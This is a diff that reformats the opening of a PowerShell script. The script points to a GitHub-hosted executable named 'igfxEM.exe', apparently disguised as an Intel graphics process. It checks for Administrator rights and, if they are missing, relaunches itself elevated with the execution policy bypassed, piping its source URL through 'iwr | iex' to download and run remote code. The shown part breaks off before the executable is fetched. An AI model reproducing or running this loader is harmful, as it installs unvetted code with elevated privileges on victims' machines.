@@ -1,16 +1,20 @@
-$ExeUrl = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
+$ExeUrl  = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
 $AppName = "igfxEM.exe"
 
 $ErrorActionPreference = "Stop"
 
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$isAdmin = ([Security.Principal.WindowsPrincipal] `
+    [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
     if ($MyInvocation.Line -match 'http') {
         $url = ($MyInvocation.Line -match '(https?://\S+)')[1]
-        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr '$url' -UseBasicParsing | iex`""
+        Start-Process powershell.exe -Verb RunAs `
+            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr '$url' -UseBasicParsing | iex`""
     } else {
-        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+        Start-Process powershell.exe -Verb RunAs `
+            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     }
     exit
 }
